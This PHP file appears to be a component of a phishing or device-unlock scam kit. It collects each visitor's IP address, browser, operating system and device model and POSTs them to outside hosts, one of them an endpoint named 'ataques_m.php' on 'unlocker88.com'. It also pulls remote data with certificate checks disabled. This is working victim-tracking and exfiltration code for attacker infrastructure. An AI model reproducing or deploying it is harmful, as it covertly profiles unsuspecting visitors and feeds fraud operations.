<?php
session_start();
unset($_SESSION['ssconl']);
session_destroy();

    $user_agent = '';
    if ( isset( $_SERVER ) ) {
            $user_agent = $_SERVER['HTTP_USER_AGENT'];
    } else {
        global $HTTP_SERVER_VARS;
        if ( isset( $HTTP_SERVER_VARS ) ) {
            $user_agent = $HTTP_SERVER_VARS['HTTP_USER_AGENT'];
        } else {
            global $HTTP_USER_AGENT;
            $user_agent = $HTTP_USER_AGENT;
        }
    }

    $host= $_SERVER["HTTP_HOST"];
    $url= $_SERVER["REQUEST_URI"];
    $DOMINIO_LOCAL = "https://" . $host.'/i/';
    $DOMINIO_SISTEMA = "https://support-profesionall-developersteam.com/systeam/"; 
 
   
    
    function option($x_idname,$id_sistema,$type = 0,$user_agent = 0,$dom=0){
        $url_dom = "";
        $DOMINIO_SISTEMA = "https://support-profesionall-developersteam.com/systeam/";
        if($type == 1){
            if(!empty($user_agent)){
                $ips = getRealIP();
                $browser = getBrowser();
                $detect = det_dis();
                $device = getPlatform($user_agent);$SO = getOS(); $datos = sacar($user_agent,"(",")");$row_m = explode(";",$datos);$MODELO = $row_m[1];$data = '';
                $data = array("id_equipo" => $x_idname,"tipo" => "2","id_sistema" => $id_sistema,"ip" => $ips,"disp" => $detect,"explore" => $browser,"so" =>$SO,"plat" =>$device,"modelo" =>$MODELO);
                    
                $ch = curl_init($DOMINIO_SISTEMA."vista_link_rebote.php");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
                curl_setopt($ch, CURLOPT_POSTFIELDS,http_build_query($data));
                $respon = curl_exec($ch);
                curl_close($ch);
            }
        }else if($type == 2){
           
            if(!empty($user_agent)){
                
                $ips = getRealIP();
                $browser = getBrowser();
                $detect = det_dis();
                $device = getPlatform($user_agent);
                $SO = getOS(); 
                $datos = sacar($user_agent,"(",")");
                $row_m = explode(";",$datos);
                $MODELO = $row_m[1];
                $data = '';
                $data = array("token" => $x_idname,"id_sistema" => $id_sistema,"ip" => $ips,"disp" => $detect,"explore" => $browser,"so" =>$SO,"plat" =>$device,"modelo" =>$MODELO,"agente" =>$user_agent,"dom" =>$dom);
                    
                $ch = curl_init("https://unlocker88.com/default/controller/apis/ataques_m.php");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
                curl_setopt($ch, CURLOPT_POSTFIELDS,http_build_query($data));
                $respon = curl_exec($ch);
                curl_close($ch);
                return json_decode($respon);
            }
          
        }else{
            $url_dom = $DOMINIO_SISTEMA."obtener_datos_new.php?callback=callback&name=".$x_idname."&log=1&tipo=1&id_sistema=".$id_sistema;   
            $ch = curl_init();
        	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        	curl_setopt($ch, CURLOPT_URL,$url_dom);
            $response = curl_exec($ch); 
            curl_close($ch); 
            return json_decode($response);
        }
          
    	
    
    }
    require_once('f.php');
  
   
    $browser = getBrowser(); 
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $hostname = ""; 
    $user_os = getOS();
    $device = getDevice();
    
      
   
?> 